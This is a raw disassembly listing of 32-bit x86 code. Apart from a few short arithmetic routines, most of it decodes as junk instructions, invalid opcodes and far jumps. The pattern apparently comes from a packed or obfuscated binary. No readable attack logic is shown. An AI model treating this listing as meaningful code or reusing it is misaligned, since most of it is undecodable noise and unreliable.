  410781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410782:	sub    al,0x8
  410784:	and    al,BYTE PTR [eax+eiz*4]
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	inc    ecx
  4107a9:	outs   dx,DWORD PTR ds:[esi]
  4107aa:	pop    esp
  4107ab:	ror    DWORD PTR [ebx-0x5c8f8fba],cl
  4107b1:	jge    0x410823
  4107b3:	jo     0x410773
  4107b5:	jge    0x4107d5
  4107b7:	mov    al,0xc
  4107b9:	and    BYTE PTR [edx+0x6a622754],ah
  4107bf:	(bad)  
  4107c0:	xchg   ebx,eax
  4107c1:	push   ebx
  4107c2:	push   ebp
  4107c3:	cmc    
  4107c4:	fisttp DWORD PTR [ebx]
  4107c6:	(bad)  [esi+edi*1]
  4107c9:	adc    eax,ecx
  4107cb:	mov    DWORD PTR [eax-0x69a12d76],edi
  4107d1:	xor    esp,DWORD PTR [ebx+0x70]
  4107d4:	dec    ecx
  4107d5:	add    ch,BYTE PTR [edx-0x13e20c6]
  4107db:	ret    0x7f06
  4107de:	in     al,0x17
  4107e0:	jmp    0x56814d51
  4107e5:	push   es
  4107e6:	rol    DWORD PTR [edx+0x2f],1
  4107e9:	xchg   ebx,eax
  4107ea:	push   ebp
  4107eb:	sar    bl,1
  4107ed:	call   DWORD PTR [edi+0x5de73601]
  4107f3:	hlt    
  4107f4:	cwde   
  4107f5:	push   esi
  4107f6:	mov    al,0x3c
  4107f8:	mov    al,0x76
  4107fa:	cmc    
  4107fb:	jmp    0xea7:0xdeba861
  410802:	pop    edx
  410803:	xor    eax,0xf6d6d130
  410808:	lods   eax,DWORD PTR ds:[esi]
  410809:	dec    edx
  41080a:	ins    BYTE PTR es:[edi],dx
  41080b:	cmc    
  41080c:	sbb    edi,ecx
  41080e:	test   eax,0x7a06e39b
  410813:	les    ebx,FWORD PTR [edx+esi*4-0x2e797b3c]
  41081a:	adc    al,BYTE PTR es:[ebp-0xef7dcd3]
  410821:	xor    al,0xa
  410823:	stc    
  410824:	pop    ss
  410825:	cli    
  410826:	dec    edi
  410827:	mov    BYTE PTR [eax+0x557bcd3b],bh
  41082d:	adc    DWORD PTR [edi-0x17de9d03],eax
  410833:	sbb    eax,0x82d374c2
  410838:	bound  ecx,QWORD PTR [ebp+0x3e]
  41083b:	stos   BYTE PTR es:[edi],al
  41083c:	fs retf 
  41083e:	cmp    eax,0x50a2f402
  410843:	pop    edx
  410844:	(bad)  
  410845:	mov    al,0x50
  410847:	mov    bl,0x6a
  410849:	adc    ch,BYTE PTR [esi+0x19]
  41084c:	mov    eax,ds:0xbc306721
  410851:	adc    DWORD PTR [ebp-0x48],0xffffffce
  410855:	sub    bh,BYTE PTR [ebp-0x50]
  410858:	ins    BYTE PTR es:[edi],dx
  410859:	cmp    ch,bh
  41085b:	shufps xmm4,XMMWORD PTR [ecx-0x2570bc07],0xc0
  410863:	mov    ch,0x3
  410865:	jecxz  0x4108d6
  410867:	lds    eax,FWORD PTR [ebx-0x4c]
  41086a:	xor    dh,bl
  41086c:	mov    edx,ecx
  41086e:	add    BYTE PTR [ebx],ch
  410870:	adc    al,0x4b
  410872:	retf   
  410873:	mov    al,ds:0xfd54def6
  410878:	sub    DWORD PTR [esi-0x9be53d],ebp
  41087e:	push   ecx
  41087f:	mov    edi,0xc7dd4b06
  410884:	(bad)  
  410885:	sbb    edx,ebx
  410887:	into   
  410888:	(bad)  
  41088a:	ret    0x7c19
  41088d:	jge    0x4108da
  41088f:	or     edx,DWORD PTR [edx]
  410891:	sbb    DWORD PTR [edx+0x60ede779],edx
  410897:	shl    DWORD PTR [eax+0x17d2e21e],cl
  41089d:	inc    ebx
  41089e:	bound  ecx,QWORD PTR [esi+eiz*8+0x615c2d6b]
  4108a5:	xlat   BYTE PTR ds:[ebx]
  4108a6:	pushf  
  4108a7:	xor    eax,0x9b5fdfb8
  4108ac:	mov    ah,0xa
  4108ae:	inc    ebp
  4108af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b0:	stc    
  4108b1:	add    eax,0xb56409aa
  4108b6:	add    DWORD PTR [ebp-0x47],esp
  4108b9:	dec    esp
  4108ba:	mov    BYTE PTR [edx+0x26],ch
  4108bd:	jns    0x410908
  4108bf:	mov    eax,ds:0xb3cdef88
  4108c4:	push   ecx
  4108c5:	sti    
  4108c6:	mov    al,0x5b
  4108c8:	in     al,dx
  4108c9:	dec    esp
  4108ca:	adc    DWORD PTR [eax],esi
  4108cc:	and    BYTE PTR [edi+ecx*2],cl
  4108cf:	pop    ebp
  4108d0:	aaa    
  4108d1:	test   DWORD PTR [edx+0x33],eax
  4108d4:	cmp    eax,0x2f0e4948
  4108d9:	jae    0x41092e
  4108db:	cs or  eax,edx
  4108de:	inc    BYTE PTR ds:0x58ca065a
  4108e4:	xlat   BYTE PTR ds:[ebx]
  4108e5:	(bad)  
  4108e7:	inc    edx
  4108e8:	sbb    eax,0x53bb831a
  4108ed:	(bad)  
  4108ee:	xor    DWORD PTR [edi],edx
  4108f0:	xor    DWORD PTR [ebx-0x19],edx
  4108f3:	in     al,0x0
  4108f5:	nop
  4108f6:	(bad)  
  4108f7:	call   0xdc13:0x14295df1
  4108fe:	in     al,0x2a
  410900:	cmp    eax,0x37eab08d
  410905:	cmc    
  410906:	mov    esi,0x798648a
  41090b:	test   al,0x7d
  41090d:	int3   
  41090e:	inc    esp
  41090f:	aam    0xca
  410911:	mov    ebx,0x3b56f15e
  410916:	les    edx,FWORD PTR [ebp+0x5]
  410919:	loope  0x410942
  41091b:	and    al,0x1e
  41091d:	jmp    0x56f2b119
  410922:	dec    eax
  410923:	push   es
  410924:	jb     0x410933
  410926:	add    BYTE PTR [eax],dl
  410928:	sbb    al,0xea
  41092a:	ss (bad) 
  41092c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41092d:	fstp   st(6)
  41092f:	jle    0x41095f
  410931:	dec    esi
  410932:	je     0x4108fe
  410934:	ds mov edi,0xe433a5fa
  41093a:	cdq    
  41093b:	icebp  
  41093c:	jp     0x4109b0
  41093e:	cmc    
  41093f:	out    0xba,eax
  410941:	or     al,0xd5
  410943:	push   es
  410944:	dec    eax
  410945:	lea    ebx,[edx-0x35]
  410948:	sub    edx,esp
  41094a:	aad    0x58
  41094c:	cmp    BYTE PTR ss:[ebp-0x5293831],bl
  410953:	and    eax,0x219c8a3
  410958:	sbb    ch,BYTE PTR [esi]
  41095a:	jbe    0x410991
  41095c:	cmp    ch,0x4a
  41095f:	jmp    0x4109ce
  410961:	inc    ebx
  410962:	int    0xb9
  410964:	xor    al,0xff
  410966:	fst    DWORD PTR [ebx]
  410968:	out    dx,al
  410969:	add    BYTE PTR [edx+edi*4],ch
  41096c:	ret    
  41096d:	int    0x6b
  41096f:	xchg   BYTE PTR [edi-0x68],al
  410972:	or     DWORD PTR [eax],ebx
  410974:	aas    
  410975:	sbb    al,0x0
  410977:	out    dx,eax
  410978:	addr16 pop ss
  41097a:	mov    dh,0xa
  41097c:	fimul  DWORD PTR [edi-0x19]
  41097f:	cmc    
  410980:	xor    eax,ecx
  410982:	call   0x392e0bc4
  410987:	fcmovu st,st(3)
  410989:	ret    0x6bbe
  41098c:	push   es
  41098d:	(bad)  
  41098e:	ficom  WORD PTR [edx-0x7d205da4]
  410994:	push   edi
  410995:	hlt    
  410996:	inc    esp
  410997:	in     eax,0x49
  410999:	dec    eax
  41099a:	add    DWORD PTR [ebx+eax*8],esp
  41099d:	or     esi,esp
  41099f:	xor    al,0x86
  4109a1:	mov    esp,0x51dcd6df
  4109a6:	sub    BYTE PTR [ecx-0x55ff9060],0x13
  4109ad:	cmp    BYTE PTR [esi-0x30],cl
  4109b0:	cld    
  4109b1:	mov    esi,0x464ba151
  4109b6:	push   edi
  4109b7:	mov    dl,0x49
  4109b9:	stos   DWORD PTR es:[edi],eax
  4109ba:	cmp    BYTE PTR [eax],0x4b
  4109bd:	fucomp st(7)
  4109bf:	pusha  
  4109c0:	(bad)  
  4109c1:	jbe    0x4109d7
  4109c3:	retf   
  4109c4:	daa    
  4109c5:	jbe    0x410a21
  4109c7:	in     eax,dx
  4109c8:	lock dec esp
  4109ca:	or     DWORD PTR [edx+0x281af5bc],0xffffc115
  4109d4:	xchg   ebx,eax
  4109d5:	test   eax,0x318cf2c8
  4109da:	dec    eax
  4109db:	add    BYTE PTR [ebx],cl
  4109dd:	shr    DWORD PTR [ecx+0x6f],cl
  4109e0:	ins    BYTE PTR es:[edi],dx
  4109e1:	inc    esi
  4109e2:	and    DWORD PTR [eax+eiz*1+0x65196ef4],edi
  4109e9:	hlt    
  4109ea:	xchg   DWORD PTR [eax+0x5c63049e],ebx
  4109f0:	in     eax,dx
  4109f1:	lods   al,BYTE PTR ds:[esi]
  4109f2:	lods   al,BYTE PTR ds:[esi]
  4109f3:	sub    ebp,DWORD PTR [ebx]
  4109f5:	rol    ebp,cl
  4109f7:	and    BYTE PTR [ebp-0x4a02e948],cl
  4109fd:	(bad)  
  4109fe:	ss addr16 dec eax
  410a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a02:	dec    esp
  410a03:	adc    BYTE PTR [edi+edi*1],cl
  410a06:	dec    edx
  410a07:	mov    eax,ds:0x55394427
  410a0c:	mov    edx,0x28df4e59
  410a11:	and    bl,BYTE PTR [esi-0x6a541d25]
  410a17:	xchg   ebx,eax
  410a18:	add    ecx,DWORD PTR [ecx]
  410a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a1b:	push   0xa4973b9
  410a20:	out    0xa1,al
  410a22:	ins    BYTE PTR es:[edi],dx
  410a23:	out    0x40,eax
  410a25:	fmul   QWORD PTR [esi]
  410a27:	jg     0x4109b6
  410a29:	out    dx,eax
  410a2a:	test   eax,0x7bdd5888
  410a2f:	fadd   st(0),st
  410a31:	jl     0x410a7b
  410a33:	lods   al,BYTE PTR ds:[esi]
  410a34:	int3   
  410a35:	cmp    al,0x64
  410a37:	in     al,dx
  410a38:	add    BYTE PTR [esi+0x5d],bh
  410a3b:	and    eax,0x44b3ed4d
  410a40:	test   BYTE PTR [esi-0xfe62df1],bl
  410a46:	cmc    
  410a47:	loop   0x4109f2
  410a49:	sub    esi,DWORD PTR [ecx+0x10]
  410a4c:	(bad)  
  410a4d:	out    dx,al
  410a4e:	sbb    dl,BYTE PTR [ebp+0x54]
  410a51:	rcr    DWORD PTR [edi-0x30],0x72
  410a55:	lock adc eax,0xbf7c8ac4
  410a5b:	(bad)  [esp+eiz*2]
  410a5e:	mov    ebp,0x8cfba6a5
  410a63:	fistp  QWORD PTR [ecx+0x56]
  410a66:	jns    0x410a3e
  410a68:	pop    edx
  410a69:	fiadd  WORD PTR [edx+eax*4-0x2fde7cc1]
  410a70:	fisttp DWORD PTR [edi+0x21961d7]
  410a76:	iret   
  410a77:	(bad)  
  410a78:	mov    edx,0x821e9b69
  410a7d:	inc    esp
  410a7e:	sbb    bl,cl
  410a80:	or     ecx,DWORD PTR [edi]
  410a82:	mov    dh,0x44
  410a84:	and    al,0x7b
  410a86:	sbb    esp,0x13
  410a89:	fwait
  410a8a:	repz std 
  410a8c:	retf   0x33f5
  410a8f:	fnstenv [esi-0x33]
  410a92:	sbb    DWORD PTR [edi+0x5677d2f7],0x872515f0
  410a9c:	(bad)  
  410a9d:	pop    esi
  410a9e:	jmp    0x49b9:0xe9465554
  410aa5:	mov    eax,0x1cdc3484
  410aaa:	sub    DWORD PTR [ebx+edi*1-0x22],ebx
  410aae:	mov    ecx,0xc899e788
  410ab3:	mov    cl,0x38
  410ab5:	sub    al,0xb5
  410ab7:	add    DWORD PTR [eax+0x1b],edi
  410aba:	dec    esp
  410abb:	fisttp DWORD PTR [eax]
  410abd:	dec    ebp
  410abe:	mov    ebx,0x8eb7b25e
  410ac3:	jle    0x410b00
  410ac5:	and    BYTE PTR [edx],ch
  410ac7:	pop    edx
  410ac8:	stos   DWORD PTR es:[edi],eax
  410ac9:	addr16 push edx
  410acb:	es jmp 0x410b04
  410ace:	push   esi
  410acf:	cmp    al,0xcc
  410ad1:	(bad)
  410ad6:	push   ds
  410ad7:	sbb    esi,DWORD PTR [ebx-0x7a]
  410ada:	mov    dl,0xea
  410adc:	out    0x7e,eax
  410ade:	or     eax,0xb4f84772
  410ae3:	jle    0x410aef
  410ae5:	int3   
  410ae6:	add    BYTE PTR [edi],dl
  410ae8:	push   cs
  410ae9:	icebp  
  410aea:	div    DWORD PTR [esi+0x66]
  410aed:	and    al,0xb7
  410aef:	jo     0x410aec
  410af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410af2:	bound  esi,QWORD PTR [ecx+0x5805b46e]
  410af8:	aaa    
  410af9:	mov    ch,0x1b
  410afb:	xchg   edx,eax
  410afc:	dec    ebx
  410afd:	and    eax,0x66ef47c4
  410b02:	jge    0x410aff
  410b04:	out    0x1f,eax
  410b06:	cdq    
  410b07:	jnp    0x410aa4
  410b09:	(bad)
  410b0c:	test   eax,0xbf57fbb0
  410b11:	xchg   ebx,eax
  410b12:	(bad)  
  410b13:	stc    
  410b14:	pop    edi
  410b15:	sbb    DWORD PTR [ebp-0x35],ebx
  410b18:	aad    0xee
  410b1a:	retf   0xef03
  410b1d:	adc    ch,BYTE PTR [edx]
  410b1f:	adc    ch,BYTE PTR [ebx+0x4461810d]
  410b25:	jg     0x410b46
  410b27:	lea    ebp,[ebp-0x6]
  410b2a:	sub    edx,ebx
  410b2c:	mov    edi,ss
  410b2e:	dec    ebx
  410b2f:	sar    ch,cl
  410b31:	ficomp WORD PTR [ebp-0x1339aed0]
  410b37:	rcr    BYTE PTR [edx],0x7a
  410b3a:	mov    ds:0xe62e3ce7,eax
  410b3f:	popa   
  410b40:	bound  esp,QWORD PTR [ecx+0x12f41185]
  410b46:	lds    edi,FWORD PTR [esi+0x2]
  410b49:	adc    ebx,DWORD PTR [eax+ebp*8+0x1a]
  410b4d:	dec    ebp
  410b4e:	xchg   ebx,eax
  410b4f:	and    ah,ch
  410b51:	js     0x410b54
  410b53:	push   edi
  410b54:	mov    dh,BYTE PTR [ebp+0x3e]
  410b57:	inc    esi
  410b58:	mov    esi,0x634e4493
  410b5d:	test   DWORD PTR [esi+eiz*8-0x37],0x5e544639
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz and al,0x4f
  410ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba7:	lahf   
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c0e
  410bb1:	pop    esp
  410bb2:	adc    DWORD PTR [eax],edi
  410bb4:	(bad)  
  410bb5:	test   DWORD PTR [eax+0x5a],0xe24705eb
  410bbc:	out    0x3,eax
  410bbe:	int3   
  410bbf:	mov    ch,BYTE PTR [ebx-0x7b]
  410bc2:	add    DWORD PTR [esi],ebx
  410bc4:	and    BYTE PTR [eax],0x1e
  410bc7:	iret   
  410bc8:	test   eax,0xa4b0b2f4
  410bcd:	mov    al,ds:0xeb5d287a
  410bd2:	clc    
  410bd3:	and    edi,DWORD PTR fs:[edx]
  410bd6:	in     al,0x27
  410bd8:	add    ebx,DWORD PTR [edx+ebp*1]
  410bdb:	dec    ebx
  410bdc:	inc    esp
  410bdd:	cld    
  410bde:	mov    dl,BYTE PTR [eax]
  410be0:	mov    ds:0x86323ecb,al
  410be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410be6:	cmp    al,0x73
  410be8:	(bad)
  410beb:	cmp    bh,BYTE PTR [ebx-0x6]
  410bee:	scas   al,BYTE PTR es:[edi]
  410bef:	sub    BYTE PTR [edi+0x5d],al
  410bf2:	fist   WORD PTR [eax-0x50a52270]
  410bf8:	imul   ecx,esi,0xe1d28055
  410bfe:	and    al,0x5c
  410c00:	aaa    
  410c01:	xchg   esi,eax
  410c02:	xor    DWORD PTR [edi],ecx
  410c04:	cmp    esp,DWORD PTR [ebx+edi*4+0x269311a3]
  410c0b:	cmp    al,0xe0
  410c0d:	enter  0xdd40,0xb
  410c11:	sub    BYTE PTR [ecx+0x6],bl
  410c14:	sub    DWORD PTR [ebx+0x32d74cc3],esi
  410c1a:	dec    esp
  410c1b:	dec    ebx
  410c1c:	sbb    al,0xd0
  410c1e:	jmp    0xf9829797
  410c23:	mov    eax,0x9912dd8b
  410c28:	cmp    al,0x9b
  410c2a:	mov    eax,0x617bfb82
  410c2f:	mov    dl,bh
  410c31:	cmp    si,WORD PTR [eax+0x6]
  410c35:	xor    al,0x3a
  410c37:	jne    0x410c05
  410c39:	lds    eax,FWORD PTR [eax]
  410c3b:	jge    0x410bbe
  410c3d:	fnsave [edx+0x7c5102f9]
  410c43:	push   ebx
  410c44:	pop    eax
  410c45:	sbb    dl,BYTE PTR gs:[edx-0x376aad2c]
  410c4c:	xchg   ebp,eax
  410c4d:	add    edi,DWORD PTR [ecx*1+0x327117e9]
  410c54:	inc    esp
  410c55:	mov    cl,0x7e
  410c57:	out    0x5d,eax
  410c59:	xchg   ecx,eax
  410c5a:	mov    ecx,0xe51b27b5
  410c5f:	addr16 mov ebp,0x4833108e
  410c65:	mov    edi,0x18df8677
  410c6a:	mov    BYTE PTR [ebp-0x1b490182],al
  410c70:	xchg   edi,eax
  410c71:	repnz out dx,al
  410c73:	pop    es
  410c74:	push   0x73
  410c76:	mov    eax,DWORD PTR [esi+esi*8-0x70596f07]
  410c7d:	cld    
  410c7e:	inc    ecx
  410c7f:	out    0xf9,eax
  410c81:	adc    DWORD PTR ds:0xfed6b81e,ecx
  410c87:	mov    dl,0xce
  410c89:	adc    DWORD PTR [esi],esp
  410c8b:	popa   
  410c8c:	mov    edx,edi
  410c8e:	mov    dl,0x63
  410c90:	sbb    al,0x9
  410c92:	or     esp,DWORD PTR [edx+0x67]
  410c95:	stos   BYTE PTR es:[edi],al
  410c96:	mov    DWORD PTR [ecx-0x6d7e8db0],ebp
  410c9c:	shl    BYTE PTR [esi-0x574dfb9a],0xf9
  410ca3:	imul   ebp,DWORD PTR [edx],0x4073209e
  410ca9:	jmp    0x410c86
  410cab:	and    BYTE PTR [edx-0x9d06490],bh
  410cb1:	sbb    al,0x5a
  410cb3:	mov    dx,0x3f0a
  410cb7:	nop
  410cb8:	(bad)  
  410cba:	dec    esp
  410cbb:	inc    ebp
  410cbc:	pop    ecx
  410cbd:	inc    edx
  410cbe:	or     BYTE PTR [ebx+0x2f1c6ee6],cl
  410cc4:	call   0x392e:0xf785e3f4
  410ccb:	mov    al,ds:0x92a273b3
  410cd0:	xchg   ebx,eax
  410cd1:	pop    ecx
  410cd2:	lods   al,BYTE PTR ds:[esi]
  410cd3:	repnz fmul st,st(6)
  410cd6:	inc    esp
  410cd7:	inc    edx
  410cd8:	inc    esi
  410cd9:	add    ebp,0xfffffffc
  410cdc:	push   cs
  410cdd:	dec    edi
  410cde:	lock mov ch,0xb4
  410ce1:	icebp  
  410ce2:	je     0x410d2e
  410ce4:	push   0x6cbd8db2
  410ce9:	pop    esp
  410cea:	imul   eax,DWORD PTR [edi+0x73],0xe
  410cee:	test   BYTE PTR [edx-0x1e],al
  410cf1:	inc    edx
  410cf2:	dec    esp
  410cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cf4:	sbb    al,0xa8
  410cf6:	push   edx
  410cf7:	push   0xba1bf436
  410cfc:	out    dx,al
  410cfd:	mov    eax,0x42f3f210
  410d02:	sbb    BYTE PTR [ecx+0x7c],ch
  410d05:	out    0xad,al
  410d07:	shl    BYTE PTR fs:[eax],0x4e
  410d0b:	mov    eax,0xfcaba831
  410d10:	push   0x19
  410d12:	popa   
  410d13:	cmp    bh,ah
  410d15:	aaa    
  410d16:	push   0x4d53ed0f
  410d1b:	stos   BYTE PTR es:[edi],al
  410d1c:	lods   eax,DWORD PTR ds:[esi]
  410d1d:	fdivr  QWORD PTR [edi+0x21]
  410d20:	fbld   TBYTE PTR [ebp-0x5a6eb4d2]
  410d26:	fwait
  410d27:	adc    al,0xd7
  410d29:	add    esp,DWORD PTR [ecx-0x3a]
  410d2c:	addr16 aas 
  410d2e:	xchg   esp,eax
  410d2f:	adc    eax,0x1edab94d
  410d34:	stc    
  410d35:	mov    ch,BYTE PTR [edx+0x8]
  410d38:	inc    ebx
  410d39:	out    0x9e,al
  410d3b:	push   ebx
  410d3c:	hlt    
  410d3d:	in     al,dx
  410d3e:	jae    0x410d33
  410d40:	inc    edx
  410d41:	out    dx,al
  410d42:	jo     0x410d7a
  410d44:	fisub  DWORD PTR [ebx+0x31]
  410d47:	sub    edi,esi
  410d49:	sbb    ebp,DWORD PTR [esi]
  410d4b:	jge    0x410dc3
  410d4d:	dec    ah
  410d4f:	sar    DWORD PTR [eax],1
  410d51:	push   cs
  410d52:	pop    ss
  410d53:	xor    al,0x86
  410d55:	push   edi
  410d56:	bound  edx,QWORD PTR [ebp-0x70]
  410d59:	sbb    eax,edx
  410d5b:	mov    eax,0x5aa404af
  410d60:	shl    esi,1
  410d62:	xchg   BYTE PTR [ecx+0x53b925c3],cl
  410d68:	icebp  
  410d69:	xor    BYTE PTR [ecx],dh
  410d6b:	icebp  
  410d6c:	cmp    al,0xf6
  410d6e:	scas   eax,DWORD PTR es:[edi]
  410d6f:	dec    eax
  410d70:	cs mov ebx,0xa5051cd2
  410d76:	cmp    esi,DWORD PTR [bx]
  410d79:	out    dx,eax
  410d7a:	mov    esp,0xb99bfe39
  410d7f:	stos   DWORD PTR es:[edi],eax
  410d80:	mov    al,0x19
  410d82:	ret    
  410d83:	push   ecx
  410d84:	pop    ecx
  410d85:	fs mov cl,0xfa
  410d88:	scas   eax,DWORD PTR es:[edi]
  410d89:	shr    cl,cl
  410d8b:	in     eax,0x76
  410d8d:	push   eax
  410d8e:	add    eax,0xbf54d5bb
  410d93:	loopne 0x410d3b
  410d95:	sbb    al,0xf9
  410d97:	add    eax,0xfaa5ae48
  410d9c:	lock add al,0x2d
  410d9f:	add    eax,0xc9ba8f40
  410da4:	and    bh,BYTE PTR [edi]
  410da6:	stos   BYTE PTR es:[edi],al
  410da7:	adc    eax,0x9e21e783
  410dac:	adc    al,0xc2
  410dae:	in     al,dx
  410daf:	push   0x4e
  410db1:	sub    ebx,DWORD PTR [ebx+0x727ca41a]
  410db7:	mov    cl,BYTE PTR [esi+0x5d0fba92]
  410dbd:	mov    dh,0xa6
  410dbf:	shr    BYTE PTR [esi],1
  410dc1:	xor    dh,BYTE PTR [ebx+0x750d78a0]
  410dc7:	adc    BYTE PTR [edi],dh
  410dc9:	ja     0x410dcb
  410dcb:	repnz pop es
  410dcd:	fild   QWORD PTR [edi-0x4b]
  410dd0:	cld    
  410dd1:	(bad)  
  410dd2:	call   0x600f:0x1e7049a3
  410dd9:	mov    esp,0xa7bf5cd1
  410dde:	push   edx
  410ddf:	push   esi
  410de0:	mov    ds:0x30aeb926,eax
  410de5:	pop    eax
  410de6:	sub    bl,BYTE PTR [ecx+0x70c9a050]
  410dec:	jmp    ebx
  410dee:	adc    bh,BYTE PTR [ebx-0x70906f87]
  410df4:	inc    ecx
  410df5:	xor    DWORD PTR [esi],eax
  410df7:	mov    esi,0x97cc5cfb
  410dfc:	sub    ah,BYTE PTR [ebx+0x48]
  410dff:	push   edi
  410e00:	ret    0x3a5a
  410e03:	xor    DWORD PTR [eax],0x2f80bda9
  410e09:	xor    BYTE PTR [ecx+0xe],ah
  410e0c:	lock or al,0x1e
  410e0f:	(bad)  
  410e10:	or     DWORD PTR [ebp+0x70dd30ba],0x6cc52b88
  410e1a:	int    0x6b
  410e1c:	dec    edi
  410e1d:	arpl   di,bx
  410e1f:	popa   
  410e20:	shl    DWORD PTR [edx],1
  410e22:	iret   
  410e23:	push   ds
  410e24:	call   0xcda1:0x9c4dce05
  410e2b:	lock in al,dx
  410e2d:	adc    DWORD PTR [ebx+0x1ded55dd],0x8d02528a
  410e37:	push   esp
  410e38:	popf   
  410e39:	mov    esp,0x3c695b48
  410e3e:	dec    ebx
  410e3f:	add    al,0xb7
  410e41:	loope  0x410e10
  410e43:	mov    esi,0x39924ca8
  410e48:	push   0xffffffbf
  410e4a:	mov    ch,0x31
  410e4c:	mov    edx,0xc192c101
  410e51:	push   0xe5ce2507
  410e56:	pop    edi
  410e57:	inc    edx
  410e58:	mov    bh,0xbc
  410e5a:	mov    ebp,0xad21e420
  410e5f:	and    DWORD PTR [esi-0x726f12a0],0xe8f82140
  410e69:	or     esp,DWORD PTR [ebx+0x78af4166]
  410e6f:	dec    ebx
  410e70:	mov    ebp,0x568c8cd4
  410e75:	outs   dx,BYTE PTR ds:[esi]
  410e76:	lahf   
  410e77:	ret    0xf2cc
  410e7a:	dec    ebp
  410e7b:	jl     0x410e3a
  410e7d:	leave  
  410e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e7f:	mov    cl,0x37
  410e81:	jo     0x410e4b
  410e83:	mov    ebx,0xa4d93e82
  410e88:	(bad)  [edi-0x73]
  410e8b:	stos   DWORD PTR es:[edi],eax
  410e8c:	sub    al,0x8b
  410e8e:	and    al,0x9b
  410e90:	sbb    edi,DWORD PTR [esi+0x62]
  410e93:	imul   eax,DWORD PTR [ebx+0x48],0xe
  410e97:	lods   eax,DWORD PTR ds:[esi]
  410e98:	aaa    
  410e99:	inc    edi
  410e9a:	lea    ebx,[edx+0x47]
  410e9d:	fidiv  WORD PTR [ecx]
  410e9f:	add    BYTE PTR [edx-0x33],al
  410ea2:	add    esp,esi
  410ea4:	cld    
  410ea5:	cli    
  410ea6:	es jg  0x410eef
  410ea9:	je     0x410e55
  410eab:	les    edx,FWORD PTR [ebx]
  410ead:	mov    ebp,0x9cc624fc
  410eb2:	movlhps xmm3,xmm3
  410eb5:	repz jge 0x410eaa
  410eb8:	sbb    BYTE PTR [esi],0x7c
  410ebb:	call   0x8ccf21e9
  410ec0:	add    esi,DWORD PTR [edx-0x20]
  410ec3:	jmp    0xc6084e5e
  410ec8:	call   0xcf43:0xda7e10eb
  410ecf:	mov    esi,0x2cd47eea
  410ed4:	xchg   BYTE PTR [eax],dh
  410ed6:	adc    DWORD PTR [ecx+0x65],ecx
  410ed9:	jae    0x410ed6
  410edb:	adc    cl,BYTE PTR [esp+ecx*1-0x33434687]
  410ee2:	inc    esp
  410ee3:	pop    ss
  410ee4:	fprem1 
  410ee6:	retf   0x1953
  410ee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eea:	int    0x2e
  410eec:	dec    esi
  410eed:	stos   DWORD PTR es:[edi],eax
  410eee:	sub    bh,BYTE PTR [ecx+esi*4+0x64]
  410ef2:	add    edi,DWORD PTR [ecx+eiz*1+0x22]
  410ef6:	push   edx
  410ef7:	push   ds
  410ef8:	sbb    bh,0x11
  410efb:	mov    eax,ds:0x29b2eea9
  410f00:	sbb    eax,esi
  410f02:	loope  0x410f7b
  410f04:	scas   eax,DWORD PTR es:[edi]
  410f05:	push   ebp
  410f06:	loope  0x410f46
  410f08:	push   ds
  410f09:	dec    ebx
  410f0a:	pop    ebp
  410f0b:	mov    cl,0xdb
  410f0d:	jle    0x410ed4
  410f0f:	into   
  410f10:	xor    eax,0xa8623cc7
  410f15:	ja     0x410eb6
  410f17:	pop    edi
  410f18:	scas   al,BYTE PTR es:[edi]
  410f19:	sahf   
  410f1a:	adc    al,0x87
  410f1c:	iret   
  410f1d:	cmp    ebx,DWORD PTR [eax]
  410f1f:	repnz push edx
  410f21:	sub    ebx,0xffffffdd
  410f24:	inc    DWORD PTR ss:[ecx+0x3407041f]
  410f2b:	jp     0x410f8e
  410f2d:	fs jmp 0x410f8c
  410f30:	push   ebx
  410f31:	test   eax,0xc292482
  410f36:	enter  0x3dc9,0xe0
  410f3a:	in     al,dx
  410f3b:	or     ebp,DWORD PTR [edx+0x39ecbc4c]
  410f41:	mov    al,ds:0xe1d616bb
  410f46:	inc    edi
  410f47:	mov    eax,ds:0xa4a41911
  410f4c:	aad    0x1b
  410f4e:	call   0x70f901a7
  410f53:	and    BYTE PTR [ebp-0x29554ff4],ah
  410f59:	addr16 mov eax,0x4e3563bb
  410f5f:	add    dh,ah
  410f61:	dec    esi
  410f62:	outs   dx,DWORD PTR ds:[esi]
  410f63:	icebp  
  410f64:	loopne 0x410efd
  410f66:	shr    DWORD PTR [ebp+0x7feebe77],cl
  410f6c:	inc    edx
  410f6d:	add    DWORD PTR [esp+ebp*4-0x4f],ebp
  410f71:	call   0x11c7:0x80193d1e
  410f78:	into   
  410f79:	jb     0x410fd3
  410f7b:	cld    
  410f7c:	outs   dx,BYTE PTR ds:[esi]
